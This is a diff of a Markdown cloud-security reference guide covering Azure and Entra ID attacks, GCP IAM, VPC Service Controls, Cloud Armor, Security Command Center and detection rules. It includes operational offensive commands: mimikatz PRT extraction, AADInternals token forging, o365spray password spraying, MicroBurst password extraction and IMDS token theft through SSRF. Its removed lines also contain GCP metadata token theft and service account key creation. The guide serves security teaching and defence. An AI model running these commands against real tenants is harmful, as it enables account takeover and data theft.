+Export-AADIntTokensFromBrowser  # Requires physical access / browser extension
+
+# Get PRTs from joined device
+Get-AADIntUserPRTToken         # Requires device joined + user logged in
+
+# Golden SAML / token forge
+# Requires ADFS token signing certificate (private key)
+New-AADIntSAMLToken -ImmutableId "base64==" -Issuer "https://adfs.contoso.com/adfs/services/trust" \
+  -PfxFileName signing.pfx -PfxPassword "pass"
+
+# Phishing / consent
+Invoke-AADIntPhishing -Recipients user@contoso.com -Teams -UseAccessToken
+```
+
+---
+
+### 4.3 Service Principal Secret Abuse
+
+**Service Principals (SPs)** are identities for applications. Credentials: client secrets or certificates.
+
+**Attack scenarios**:
+1. **Secret in code/repo**: Developer commits SP secret to GitHub → attacker finds via search
+2. **Secret in pipeline**: CI/CD variable leak → secret extracted from build logs
+3. **Overprivileged SP**: SP with Owner/Contributor → escalate to full subscription control
+4. **SP with MS Graph app permissions**: `RoleManagement.ReadWrite.Directory` → add self to Global Admin
+
+```bash
+# Authenticate as service principal
+az login --service-principal -u <app-id> -p <secret-or-cert> --tenant <tenant-id>
+
+# Check SP permissions
+az role assignment list --assignee <sp-object-id> --all
+# Check app role assignments (Graph permissions)
+az ad sp show --id <sp-id> --query "appRoles"
+
+# Escalation: if SP has Application.ReadWrite.All or AppRoleAssignment.ReadWrite.All
+# Add admin Graph permissions to own app, grant admin consent → escalate
+```
+
+---
+
+### 4.4 OAuth App Consent Phishing (Illicit Consent Grant)
+
+Attacker registers malicious Azure AD application with high-permission scopes and tricks user into consenting.
+
+**Attack flow**:
+1. Register app in attacker tenant (or compromised tenant)
+2. Configure requested permissions: `Mail.Read`, `Files.ReadWrite.All`, `offline_access`
+3. Craft authorization URL and deliver to victim
+4. Victim clicks, consents → app gets persistent access via refresh token
+5. Attacker uses OAuth tokens to read email/files indefinitely
+
+**Detection**:
+- Monitor: `Audit Log → Application → Consent to application`
+- Look for: new app registrations + consent events from unusual countries
+- Risky permissions: `Mail.ReadWrite`, `Files.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`
+
+**Prevention**:
+- Disable user consent for apps (require admin approval)
+- Configure publisher verification requirement
+- Deploy Defender for Cloud Apps policies for risky OAuth app detection
+- Conditional Access: block unknown/unverified app consent
+
+---
+
+### 4.5 PRT Attacks (Pass-the-PRT)
+
+**Primary Refresh Token (PRT)**: Long-lived token (14 days) issued to devices registered/joined to Entra ID. Used to obtain access tokens for any app without MFA re-prompt.
+
+**Attack methods**:
+1. **Chrome SSO abuse**: Chrome uses PRT cookie (`x-ms-RefreshTokenCredential`) automatically for Microsoft sites. If attacker has local code execution on the device, can extract this cookie.
+2. **Pass-the-PRT**: Steal PRT (from LSASS via mimikatz `sekurlsa::cloudap`, or from Windows Hello data), use to get tokens.
+3. **BrowserCore.exe abuse**: Chrome calls this Windows binary to obtain PRT cookies — can be intercepted.
+
+```
+# Mimikatz PRT extraction (requires local admin / SYSTEM)
+sekurlsa::cloudap
+# → Returns dpapi encrypted PRT blob
+# Decrypt with: dpapi::cloudapkd /keyvalue:<key> /unprotect
+
+# Use PRT with ROADtoken or AADInternals
+Invoke-AADIntDeviceCode -Resource https://graph.microsoft.com
+```
+
+**Phishing-resistant MFA (FIDO2/Windows Hello) does NOT prevent PRT abuse if device is already compromised.**
+
+---
+
+### 4.6 Device Code Phishing
+
+Abuses OAuth Device Authorization Grant flow.
+
+**Attack flow**:
+1. Attacker initiates device code flow: `POST https://login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode`
+2. Gets `device_code` and `user_code` (e.g., "ABCD-EFGH")
+3. Sends `user_code` to victim (email/chat): "Please authenticate at https://microsoft.com/devicelogin and enter code ABCD-EFGH"
+4. Victim authenticates (including MFA) and enters code
+5. Attacker polls token endpoint and receives access + refresh tokens
+6. Attacker now has persistent access
+
+**Detection**: Sign-in logs with `Device Code` authentication method from unfamiliar device.
+
+**Prevention**: Conditional Access — block device code flow (Authentication flows condition → Block device code flow).
+
+---
+
+### 4.7 AzureHound / BloodHound for Azure
+
+**BloodHound** (now BloodHound Community Edition / BloodHound Enterprise) maps attack paths in AD and Azure.
+
+**AzureHound**: Data collector for BloodHound targeting Azure/Entra ID.
+
+```bash
+# Collect Azure data with AzureHound
+./azurehound -u "user@tenant.com" -p "Password" list --tenant "tenant.com" -o output.json
+# With service principal
+./azurehound -a <app-id> -s <secret> list --tenant <tenant-id> -o output.json
+
+# Ingest into BloodHound
+# Upload output.json via BloodHound UI
+
+# Key BloodHound Azure attack paths:
+# AZAddMembers → add member to group
+# AZAddOwner → take ownership of object
+# AZAppAdmin → Application Administrator can reset SP credentials
+# AZContributor → Azure RBAC Contributor on subscription/RG
+# AZGetCertificates → read Key Vault certificates
+# AZGlobalAdmin → Global Administrator (highest privilege)
+# AZGrant → grant app role assignment
+# AZMGAddMember → via MS Graph API add group member
+# AZOwns → owns AAD object
+# AZPrivilegedRoleAdmin → can manage role assignments
+# AZRunsAs → VM runs as managed identity
+# AZVMContributor → can run scripts on VMs
+```
+
+---
+
+### 4.8 PowerZure & MicroBurst
+
+**PowerZure**: PowerShell framework for assessing Azure environments post-compromise.
+
+```powershell
+Import-Module PowerZure.ps1
+# Enumeration
+Get-AzureTargets                 # List high-value targets (VMs, SPs, etc.)
+Get-AzureADUsers                 # List all AAD users
+Get-AzureRoleAssignments         # List all role assignments
+Get-AzureRunAsAccounts           # Find Automation RunAs accounts (legacy, deprecated)
+Get-AzureKeyVaultContent         # Read Key Vault secrets/keys
+Get-AzureStorageContent          # List storage account contents
+# Code execution
+Invoke-AzureRunCommand           # Run command on VM via Run Command feature
+Invoke-AzureRunMSBuild           # MSBuild payload via Run Command
+```
+
+**MicroBurst**: Azure offensive security toolset.
+
+```powershell
+Import-Module MicroBurst.psm1
+# Unauthenticated recon
+Invoke-EnumerateAzureBlobs -Base companyname        # Enumerate blob storage
+Invoke-EnumerateAzureSubDomains -Base companyname   # Enumerate subdomains
+# Authenticated recon
+Get-AzurePasswords                                  # Extract passwords from various services
+Get-AzureKeyVaults                                  # List key vaults
+Invoke-AzureRTIngest                               # Ingest data into BloodHound
+```
+
+---
+
+### 4.9 Conditional Access Bypass via Legacy Authentication
+
+**Legacy auth protocols** (SMTP AUTH, POP3, IMAP, basic auth to Exchange Online, older Office clients) do not support modern auth and cannot satisfy MFA challenges.
+
+**Attack**: Use legacy protocol to authenticate with just username/password — bypasses MFA-requiring Conditional Access policies that don't explicitly block legacy auth.
+
+```bash
+# Test if legacy auth is available
+# Use tool like MailSniper, o365spray, or manual IMAP connection
+curl -k --url "imaps://outlook.office365.com:993" \
+  --user "user@contoso.com:Password1"
+
+# o365spray for credential spraying via legacy auth
+python o365spray.py --spray -U users.txt -p Password1 --count 1 --lockout 5 --domain contoso.com
+```
+
+**Detection**: Sign-in logs showing `Client app: IMAP`, `POP3`, `SMTP`, `Exchange ActiveSync`, `Other clients`.
+
+**Mitigation**: Block legacy authentication via Conditional Access (Client apps condition → select legacy auth clients → Block).
+
+---
+
+### 4.10 SSRF to Azure IMDS
+
+Azure Instance Metadata Service: `http://169.254.169.254/metadata/`
+
+```bash
+# Requires: SSRF + ability to set custom headers (Metadata: true required)
+# Many SSRF tools can set headers; curl example:
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# Returns: access_token, refresh_token, client_id, object_id, tenant_id, expires_in
+
+# Use token to interact with Azure ARM API
+curl -H "Authorization: Bearer <access_token>" \
+  "https://management.azure.com/subscriptions?api-version=2020-01-01"
+```
+
+**Key IMDS endpoints**:
+```
+/metadata/instance?api-version=2021-02-01       # VM metadata (subscription, resource group, etc.)
+/metadata/identity/oauth2/token?...             # Managed identity token
+/metadata/attested/document?api-version=...     # Attestation document
+/metadata/scheduledevents?api-version=2020-07-01 # Scheduled events
+```
+
+---
+
+## 5. GCP Security
+
+### 5.1 GCP IAM
+
+#### Role Types
+
+| Type | Description | Example |
+|---|---|---|
+| Primitive roles | Legacy, coarse-grained (project-level) | roles/viewer, roles/editor, roles/owner |
+| Predefined roles | Service-specific curated roles | roles/storage.objectViewer, roles/bigquery.dataEditor |
+| Custom roles | User-defined granular roles | Organization or project scope |
+
+**Primitive roles should not be used in production** — they grant broad permissions across all services.
+
+#### IAM Policy Binding Structure
+
+```json
+{
+  "bindings": [{
+    "role": "roles/storage.objectViewer",
+    "members": [
+      "user:alice@example.com",
+      "serviceAccount:my-sa@my-project.iam.gserviceaccount.com",
+      "group:devs@example.com",
+      "domain:example.com",
+      "allAuthenticatedUsers",
+      "allUsers"
+    ],
+    "condition": {
+      "title": "Temporary access",
+      "description": "Expires 2024-12-31",
+      "expression": "request.time < timestamp('2024-12-31T00:00:00Z')"
+    }
+  }]
+}
+```
+
+**IAM principals**: `user:`, `serviceAccount:`, `group:`, `domain:`, `principalSet:`, `allUsers` (public), `allAuthenticatedUsers`
+
+#### Service Account Security
+
+**Service account impersonation** requires `iam.serviceAccounts.actAs` permission (part of `roles/iam.serviceAccountUser`).
+
+```bash
+# Create service account
+gcloud iam service-accounts create my-sa --display-name="My SA"
+
+# Grant role to SA
+gcloud projects add-iam-policy-binding my-project \
+  --member="serviceAccount:my-sa@my-project.iam.gserviceaccount.com" \
+  --role="roles/storage.objectViewer"
+
+# Impersonate SA (requires iam.serviceAccounts.actAs + target role)
+gcloud storage ls --impersonate-service-account=my-sa@my-project.iam.gserviceaccount.com
+
+# Create key (avoid when possible — use WIF instead)
+gcloud iam service-accounts keys create key.json \
+  --iam-account my-sa@my-project.iam.gserviceaccount.com
+
+# List keys
+gcloud iam service-accounts keys list --iam-account my-sa@my-project.iam.gserviceaccount.com
+```
+
+**Service account key security risks**:
+- Keys are long-lived credentials that can be exfiltrated
+- Organization policy `constraints/iam.disableServiceAccountKeyCreation` prevents key creation
+- Prefer Workload Identity Federation instead
+
+#### Workload Identity Federation (WIF)
+
+WIF allows external workloads (GitHub Actions, AWS, Azure, on-prem) to authenticate as GCP service accounts without keys.
+
+```bash
+# GitHub Actions → GCP via WIF
+gcloud iam workload-identity-pools create "github-pool" --location="global"
+gcloud iam workload-identity-pools providers create-oidc "github-provider" \
+  --location="global" \
+  --workload-identity-pool="github-pool" \
+  --issuer-uri="https://token.actions.githubusercontent.com" \
+  --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository" \
+  --attribute-condition="assertion.repository=='my-org/my-repo'"
+
+# Allow WIF to impersonate SA
+gcloud iam service-accounts add-iam-policy-binding my-sa@project.iam.gserviceaccount.com \
+  --role="roles/iam.workloadIdentityUser" \
+  --member="principalSet://iam.googleapis.com/projects/PROJECT_NUM/locations/global/workloadIdentityPools/github-pool/attribute.repository/my-org/my-repo"
+```
+
+---
+
+### 5.2 Organization Policies
+
+Organization policies enforce governance constraints across GCP organization.
+
+**Key constraints**:
+
+| Constraint | Description |
+|---|---|
+| `constraints/compute.vmExternalIpAccess` | Restrict external IPs for VMs (list policy — allowlist specific VMs) |
+| `constraints/compute.requireShieldedVm` | Require Shielded VMs with vTPM + integrity monitoring |
+| `constraints/compute.skipDefaultNetworkCreation` | Don't create default VPC in new projects |
+| `constraints/storage.publicAccessPrevention` | Prevent public Cloud Storage access (enforced/inherited) |
+| `constraints/storage.uniformBucketLevelAccess` | Require uniform bucket IAM (disable legacy ACLs) |
+| `constraints/iam.disableServiceAccountKeyCreation` | Prevent SA key creation |
+| `constraints/iam.disableServiceAccountKeyUpload` | Prevent SA key upload |
 | `constraints/iam.allowedPolicyMemberDomains` | Restrict IAM bindings to specific domains |
-| `constraints/compute.restrictPublicIPAddresses` | Block public IPs on GCE instances |
-| `constraints/storage.uniformBucketLevelAccess` | Disable ACLs on GCS buckets |
-| `constraints/compute.requireShieldedVm` | Require Shielded VM features |
+| `constraints/compute.restrictCloudNATUsage` | Restrict Cloud NAT configurations |
 | `constraints/gcp.resourceLocations` | Restrict resource creation to specific regions |
-
-**VPC Service Controls:**
-- Create a security perimeter around GCP services (GCS, BigQuery, etc.)
-- Prevent data exfiltration: API calls from outside the perimeter are denied
-- Context-aware access: allow access based on identity + device + network
+| `constraints/compute.disableSerialPortAccess` | Disable serial port access to VMs |
+| `constraints/compute.vmCanIpForward` | Restrict IP forwarding on VMs |
 
 ---
 
-### GCP Security Services
+### 5.3 VPC Service Controls
 
-| Service | Purpose |
+VPC Service Controls (VPC-SC) create security perimeters around GCP resources to prevent data exfiltration.
+
+**Key concepts**:
+- **Service perimeter**: Logical boundary around GCP projects. Resources inside cannot be accessed from outside (by default).
+- **Restricted services**: APIs protected by the perimeter (e.g., storage.googleapis.com, bigquery.googleapis.com)
+- **Access levels**: Conditions that define trusted contexts (IP ranges, device state, identity)
+- **Ingress/Egress policies**: Fine-grained rules for cross-perimeter access
+
+```bash
+# Create access policy (org-level singleton)
+gcloud access-context-manager policies create --organization=ORG_ID --title="Corp Policy"
+
+# Create access level (trusted IP range)
+gcloud access-context-manager levels create trusted-corp \
+  --policy=POLICY_ID \
+  --basic-level-spec=conditions.yaml
+# conditions.yaml: - ipSubnetworks: ["203.0.113.0/24"]
+
+# Create service perimeter
+gcloud access-context-manager perimeters create prod-perimeter \
+  --policy=POLICY_ID \
+  --title="Production Perimeter" \
+  --resources=projects/123456789 \
+  --restricted-services=storage.googleapis.com,bigquery.googleapis.com \
+  --access-levels=trusted-corp
+```
+
+**Dry-run mode**: Test perimeter changes without enforcement — generates audit logs showing what would be blocked.
+
+---
+
+### 5.4 BeyondCorp Enterprise & Cloud Armor
+
+**BeyondCorp Enterprise**: Google's Zero Trust access solution for enterprise applications.
+- Context-aware access based on user identity + device posture
+- Integration with Chrome browser for endpoint verification
+- Certificate-based access for non-HTTP applications
+
+**Cloud Armor**: WAF and DDoS protection for Google Cloud.
+
+```bash
+# Create security policy
+gcloud compute security-policies create my-waf-policy --description "WAF policy"
+
+# Add rule: block specific IP
+gcloud compute security-policies rules create 1000 \
+  --security-policy my-waf-policy \
+  --src-ip-ranges "198.51.100.0/24" \
+  --action deny-403
+
+# Add pre-configured WAF rule (ModSecurity CRS)
+gcloud compute security-policies rules create 2000 \
+  --security-policy my-waf-policy \
+  --expression "evaluatePreconfiguredExpr('xss-v33-stable')" \
+  --action deny-403
+
+# Rate limiting
+gcloud compute security-policies rules create 3000 \
+  --security-policy my-waf-policy \
+  --src-ip-ranges "*" \
+  --action rate-based-ban \
+  --rate-limit-threshold-count 100 \
+  --rate-limit-threshold-interval-sec 60
+
+# Attach to backend service
+gcloud compute backend-services update my-backend \
+  --security-policy my-waf-policy --global
+```
+
+**Adaptive Protection**: ML-based DDoS detection and automatic rule suggestions.
+
+---
+
+### 5.5 Security Command Center (SCC)
+
+GCP's centralized security management and threat detection service.
+
+**Finding sources**:
+
+| Source | Description |
 |---|---|
-| **Security Command Center (SCC)** | CSPM; vulnerability findings (misconfigurations, CVEs); threat detection; asset inventory |
-| **Chronicle** | Cloud-native SIEM at petabyte scale; UDM normalized events; YARA-L detection rules |
-| **Cloud Armor** | WAF + DDoS protection; managed rule sets; custom rules; adaptive protection (ML-based) |
-| **Cloud KMS / Cloud HSM** | Key management; FIPS 140-2 Level 3 (HSM); customer-managed keys for GCP services |
-| **Secret Manager** | Secrets storage; versioning; automatic rotation; audit logging |
-| **Binary Authorization** | Enforce signed container images in GKE; attestation-based deploy policy |
-| **Artifact Analysis** | Container image vulnerability scanning (CVE); OS packages; language packages |
-| **Access Transparency** | Logs of Google admin access to customer data in GCP |
-| **VPC Service Controls** | Service perimeter to prevent data exfiltration |
-| **Cloud Audit Logs** | Admin Activity, Data Access, System Event logs for all GCP services |
-| **Chronicle SOAR** | Playbook automation for security operations |
+| Security Health Analytics | Misconfiguration detection (500+ detectors) |
+| Event Threat Detection (ETD) | Real-time threat detection from Cloud Logging |
+| Container Threat Detection | Runtime container threat detection |
+| Web Security Scanner | Web app vulnerability scanning |
+| VM Threat Detection | Memory-based malware detection in VMs |
+| Sensitive Data Protection | DLP findings in cloud storage |
+| Infrastructure as Code (IaC) | IaC security posture in Security Command Center |
+
+**Event Threat Detection finding types**:
+- `Account_Has_Leaked_Credentials`: Credentials found in public repos
+- `Brute_Force_SSH`: SSH brute force detected
+- `Cryptomining`: Cryptocurrency mining detected
+- `Data_Exfiltration_BigQuery`: Unusual BigQuery data exfiltration
+- `Defense_Evasion_Disable_Log_Events`: Audit logging disabled
+- `Initial_Access_Log4j_Bad_IP`: Log4j exploitation from known-bad IP
+- `Lateral_Movement_Credential_Access`: Service account token misuse
+- `Privilege_Escalation_Impersonate_Service_Account`: SA impersonation chain
+- `Exfiltration_BigQuery_Extraction`: Large data extraction to external destination
 
 ---
 
-### GCP Attacks
+### 5.6 Cloud Audit Logs
 
-#### SSRF to GCP Metadata Service
+**Log types**:
 
-```bash
-# GCP requires Metadata-Flavor: Google header (mitigates naive SSRF)
-curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
-# Returns: access_token (OAuth 2.0 bearer token for the instance SA)
-
-# Get instance info
-curl -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true"
-
-# Get project info
-curl -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
-```
-
-#### Service Account Key Exfiltration
-
-```bash
-# List service account keys
-gcloud iam service-accounts keys list \
-  --iam-account=sa-name@project.iam.gserviceaccount.com
-
-# Create new SA key (requires iam.serviceAccountKeys.create)
-gcloud iam service-accounts keys create sa-key.json \
-  --iam-account=sa-name@project.iam.gserviceaccount.com
-
-# Authenticate with stolen key
-gcloud auth activate-service-account --key-file=sa-key.json
-```
-
-#### GCP Enumeration & Attack Tools
-
-```bash
-# GCPBucketBrute — find public GCS buckets
-python3 GCPBucketBrute.py --keyword targetcompany
-
-# gcp_scanner — multi-resource enumeration
-python3 scanner.py -g -p project-id
-
-# GCP privilege escalation: iam.serviceAccounts.actAs
-gcloud iam service-accounts add-iam-policy-binding \
-  admin-sa@project.iam.gserviceaccount.com \
-  --member="serviceAccount:low-priv-sa@project.iam.gserviceaccount.com" \
-  --role="roles/iam.serviceAccountTokenCreator"
-# Then impersonate:
-gcloud auth print-access-token --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com
-```
-
-#### GCP Privilege Escalation Paths
-
-| Permission | Escalation |
-|---|---|
-| `iam.serviceAccounts.actAs` + `run.services.create` | Deploy Cloud Run service as higher-priv SA |
-| `iam.serviceAccounts.actAs` + `cloudfunctions.functions.create` | Deploy Cloud Function as higher-priv SA |
-| `iam.roles.update` | Add permissions to existing custom role |
-| `iam.roles.create` | Create new custom role with desired permissions |
-| `resourcemanager.projects.setIamPolicy` | Grant any permission at project level |
-| `compute.instances.create` + `iam.serviceAccounts.actAs` | Launch VM with higher-priv SA attached |
-
----
-
-## 5. Cloud Attack Frameworks & Tools
-
-| Tool | Platform | Purpose |
+| Type | Description | Default |
 |---|---|---|
-| **CloudFox** | AWS, Azure | Attack path analysis; `github.com/BishopFox/cloudfox`; finds exploitable paths (SSRF, misconfigs, secrets) |
-| **Pacu** | AWS | Exploitation framework; 50+ modules; simulate attacker techniques; `github.com/RhinoSecurityLabs/pacu` |
-| **ScoutSuite** | AWS, Azure, GCP, Alibaba, Oracle | Multi-cloud security auditing; generates HTML report; maps to CIS/NIST |
-| **Prowler** | AWS, Azure, GCP | Compliance scanning; CIS, NIST, PCI, HIPAA, GDPR; CI/CD integration |
-| **Steampipe** | All clouds | SQL queries across cloud APIs; `select * from aws_s3_bucket where bucket_policy_is_public` |
-| **Cartography** | AWS | Graph-based cloud asset inventory; Neo4j; shows blast radius of access |
-| **PMapper** | AWS | IAM privilege escalation graph; `who can become admin?` queries |
-| **ROADtools** | Azure | Azure AD enumeration; GUI for exploring relationships; `roadrecon gather` |
-| **AzureHound** | Azure | BloodHound collector for Azure; maps RBAC attack paths |
-| **BloodHound CE** | Azure, on-prem AD | Attack path visualization; shortest path to admin |
-| **Nuclei cloud templates** | All | Cloud misconfiguration detection templates; `nuclei -t cloud/aws/` |
-| **TruffleHog** | All | Secrets scanning in git repos, S3, GCS, Jira |
-| **gitleaks** | All | Pre-commit hook and CI/CD secrets detection |
-| **CloudSplaining** | AWS | IAM policy analysis; identifies resource exposure and privilege escalation |
-| **Parliament** | AWS | IAM policy linter; identifies mistakes before deployment |
+| Admin Activity | Admin operations (write operations on metadata/configuration) | Always enabled, cannot disable |
+| Data Access | Data plane operations (read metadata, read/write user data) | Disabled by default (enable per service) |
+| System Event | Google system operations | Always enabled |
+| Policy Denied | Requests denied by VPC-SC or org policy | Enabled when VPC-SC active |
+
+```bash
+# Query audit logs (gcloud)
+gcloud logging read 'logName="projects/my-project/logs/cloudaudit.googleapis.com%2Factivity"' \
+  --limit=50 --format=json
+
+# Detect service account key creation
+gcloud logging read 'protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"' \
+  --limit=20
+
+# Log sink to Cloud Storage (for long-term retention)
+gcloud logging sinks create my-sink storage.googleapis.com/my-log-bucket \
+  --log-filter='logName:"cloudaudit.googleapis.com"'
+```
 
 ---
 
-## 6. Cloud Security Posture Management (CSPM)
+### 5.7 Cloud KMS & Binary Authorization
 
-### What CSPM Does
+**Cloud KMS**:
+- **Key rings**: Logical groupings of keys (regional resource)
+- **CryptoKeys**: Symmetric (AES-256-GCM) or asymmetric (RSA, EC) keys
+- **Key versions**: Rotation creates new primary version; old versions can decrypt but not encrypt
+- **CMEK**: Customer-managed encryption key for GCP services (BigQuery, GCS, Compute, etc.)
+- **CSEK**: Customer-supplied keys (bring your own key material per-request — not managed by GCP)
+- **Cloud HSM**: FIPS 140-2 Level 3 HSM-backed keys
+- **Key Access Justifications**: Required justification for each key operation (enterprise feature)
 
-Cloud Security Posture Management continuously assesses cloud resource configurations against security benchmarks, compliance frameworks, and best practices.
-
-**Core CSPM Functions:**
-1. Asset inventory across accounts/subscriptions/projects
-2. Configuration assessment against CIS, NIST, PCI, SOC 2 benchmarks
-3. Drift detection — alert when configuration deviates from baseline
-4. Risk prioritization — vulnerability context + identity access + data sensitivity
-5. Compliance reporting — automated evidence collection for auditors
-6. Remediation guidance — step-by-step fix instructions (or auto-remediation)
-
-### Commercial CSPM Tools
-
-| Tool | Differentiator |
-|---|---|
-| **Wiz** | Security graph connecting identities → workloads → data → vulnerabilities; CNAPP platform |
-| **Prisma Cloud (Palo Alto)** | Broad CNAPP; strong DevSecOps integration; code-to-cloud |
-| **Lacework** | Behavioral anomaly detection; ML-based threat detection |
-| **Orca Security** | Agentless side-scanning of workloads; no agent needed |
-| **Tenable Cloud Security** | Vulnerability-centric; JIT access; IaC scanning (formerly Accurics) |
-| **CrowdStrike Falcon Cloud Security** | Agent-based CWPP + agentless CSPM; unified XDR platform |
-| **Sysdig Secure** | Container/K8s focused; runtime security; Falco-based |
-
-### Wiz Security Graph Concept
-
-Wiz correlates multiple risk factors into attack paths:
-- **Identity risk**: overpermissive roles, unused permissions
-- **Workload vulnerability**: CVEs on running instances/containers
-- **Network exposure**: internet-exposed resources
-- **Data sensitivity**: PII/secrets in S3/storage
-- **Combined toxic combination**: "EC2 with critical CVE + internet-exposed + has admin role + accesses S3 with PII"
-
-### Key Security Benchmarks
-
-| Benchmark | Source | Coverage |
-|---|---|---|
-| CIS AWS Foundations 2.0 | CIS | 58 recommendations; IAM, logging, networking, monitoring |
-| CIS Azure 2.0 | CIS | Identity, defender, storage, database, networking, logging |
-| CIS GCP 2.0 | CIS | IAM, logging, VMs, storage, cloud SQL, networking |
-| AWS Well-Architected Security Pillar | AWS | IAM, detection, infra protection, data protection, IR |
-| NIST SP 800-53 Cloud | NIST | 1000+ controls mapped to cloud services |
-| SOC 2 Trust Service Criteria | AICPA | CC (security), A (availability), C (confidentiality), PI (processing integrity), P (privacy) |
-
----
-
-## 7. Kubernetes Security
-
-### K8s Attack Surface
-
-| Component | Risk |
-|---|---|
-| API server (`kube-apiserver`) | Unauthenticated access, SSRF, JWT bypass |
-| etcd | Stores all cluster secrets in base64 (not encrypted by default); direct access = cluster compromise |
-| kubelet | Unauthenticated kubelet port 10250 → exec into any pod |
-| Container runtime | Privilege escalation from container to host |
-| Service accounts | Default SA auto-mounted with token; abused for lateral movement |
-| Helm charts | Default values with insecure settings |
-
-### RBAC Misconfigurations
+**Binary Authorization** (GKE):
+- Policy-based deploy-time security for container images
+- Requires attestations (Cosign signatures from CI/CD pipeline) before image can run
+- Attestors: verify image came from approved build system and passed security scans
+- Breakglass: emergency bypass with audit logging
 
 ```yaml
-# DANGEROUS: cluster-admin for service account
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: dangerous-binding
-subjects:
-- kind: ServiceAccount
-  name: default
-  namespace: default
-roleRef:
-  kind: ClusterRole
-  name: cluster-admin
-  apiGroup: rbac.authorization.k8s.io
-
-# DANGEROUS: wildcard permissions
-rules:
-- apiGroups: ["*"]
-  resources: ["*"]
-  verbs: ["*"]
+# Binary Authorization policy
+admissionWhitelistPatterns:
+- namePattern: "gcr.io/google_containers/*"
+defaultAdmissionRule:
+  evaluationMode: REQUIRE_ATTESTATION
+  enforcementMode: ENFORCED_BLOCK_AND_AUDIT_LOG
+  requireAttestationsBy:
+  - projects/my-project/attestors/build-attestor
 ```
-
-### Secure Pod Security Context
-
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secure-pod
-spec:
-  securityContext:
-    runAsNonRoot: true
-    runAsUser: 1000
-    runAsGroup: 3000
-    fsGroup: 2000
-    seccompProfile:
-      type: RuntimeDefault
-  containers:
-  - name: app
-    image: app:1.0
-    securityContext:
-      allowPrivilegeEscalation: false
-      readOnlyRootFilesystem: true
-      capabilities:
-        drop: ["ALL"]
-    resources:
-      limits:
-        cpu: "500m"
-        memory: "128Mi"
-```
-
-### Container Escape Techniques
-
-| Technique | Requirement | Description |
-|---|---|---|
-| Privileged container | `securityContext.privileged: true` | Access host devices; mount host filesystems |
-| `docker.sock` mount | `/var/run/docker.sock` mounted | Create new privileged containers on host |
-| `hostPath` write | Writable path to `/etc`, `/root`, etc. | Write SSH keys, cron jobs, or binaries |
-| `hostPID` | `hostPID: true` | Access host processes; ptrace attack |
-| `hostNetwork` | `hostNetwork: true` | Access host network stack; SSRF from host IP |
-| CVE-based | Varies (CVE-2019-5736, CVE-2022-0847) | Container runtime / kernel exploits |
-
-### K8s Security Tooling
-
-| Tool | Purpose |
-|---|---|
-| **Trivy** | Image vulnerability scanning; also misconfig and secret scanning |
-| **Falco** | Runtime security; detects unexpected process execution, file access, network connections |
-| **kube-bench** | CIS Kubernetes Benchmark compliance check |
-| **kube-hunter** | Active penetration testing of K8s clusters |
-| **kyverno** | Policy-as-code; admission controller; mutation and validation webhooks |
-| **OPA Gatekeeper** | Rego-based policy enforcement at admission time |
-| **Checkov** | IaC static analysis; K8s manifests, Terraform, Helm charts |
-| **Kubescape** | NSA/CISA K8s hardening framework compliance check |
 
 ---
 
-## 8. Serverless Security
+### 5.8 Chronicle SIEM
 
-### Attack Surface: Lambda / Azure Functions / Cloud Functions
+Google's cloud-native SIEM with petabyte-scale, sub-second search.
 
-| Vector | Risk |
-|---|---|
-| Environment variable secrets | Secrets in `process.env`; visible in function configuration; exposed via XXE/SSRF/LFI |
-| Overprivileged execution role | Lambda with `*:*` on `*` — full account compromise via function invoke |
-| Event injection | Malicious payload via SNS/SQS/S3 event trigger; if function evaluates input unsafely |
-| Dependency vulnerabilities | npm/pip packages in deployment package; no runtime patching |
-| Cold start timing | Information leakage about function warm/cold state |
-| Shared /tmp | Persistent /tmp between invocations in same container (625MB); potential data leakage |
-| SSRF from function | Lambda in VPC can reach internal resources + IMDS at 169.254.169.254 |
+- **YARA-L 2.0**: Detection language (rule-based, multi-event correlation)
+- **UDM** (Unified Data Model): Normalized schema for all log types
+- **Parsers**: Pre-built parsers for 700+ log sources, custom parsers available
+- **Threat Intelligence**: Integration with Google VirusTotal, third-party STIX/TAXII feeds
+- **SOAR integration**: Built-in playbooks, or integrate with Siemplify (acquired by Google)
+- **Backstory data retention**: 12 months hot (instant search), additional cold storage
 
-### Lambda Security Best Practices
+```
+// YARA-L 2.0 detection rule example
+rule brute_force_followed_by_success {
+  meta:
+    author = "TeamStarWolf"
+  events:
+    $fail.metadata.event_type = "USER_LOGIN"
+    $fail.metadata.vendor_name = "Microsoft"
+    $fail.security_result.action = "BLOCK"
+    $fail.principal.user.email_addresses = $user
 
-```python
-# INSECURE: secrets in environment variables
-import os
-db_password = os.environ['DB_PASSWORD']  # Visible in Lambda console
+    $success.metadata.event_type = "USER_LOGIN"
+    $success.security_result.action = "ALLOW"
+    $success.principal.user.email_addresses = $user
 
-# SECURE: use Secrets Manager
-import boto3
-import json
+    $fail.metadata.event_timestamp.seconds < $success.metadata.event_timestamp.seconds
 
-def get_secret(secret_name):
-    client = boto3.client('secretsmanager')
-    response = client.get_secret_value(SecretId=secret_name)
-    return json.loads(response['SecretString'])
+  match:
+    $user over 10m
 
-# INSECURE: overly broad execution role (AdministratorAccess)
-# Resource: "*"
-# Action: "*:*"
-
-# SECURE: least-privilege execution role
-# Allow only: logs:CreateLogGroup, logs:CreateLogStream, logs:PutLogEvents
-# Plus specific actions needed: e.g., s3:GetObject on specific bucket
+  condition:
+    #fail > 10 and $success
+}
 ```
 
-**Least-Privilege Lambda Execution Role:**
+---
+
+## 6. Multi-Cloud Attack Tools
+
+### 6.1 ScoutSuite
+
+Multi-cloud security auditing tool. Generates HTML report with findings by service.
+
+```bash
+# Install
+pip install scoutsuite
+
+# AWS scan (uses configured profile or instance credentials)
+python scout.py aws --report-dir ./scout-report
+python scout.py aws --profile production --report-dir ./scout-prod --no-browser
+
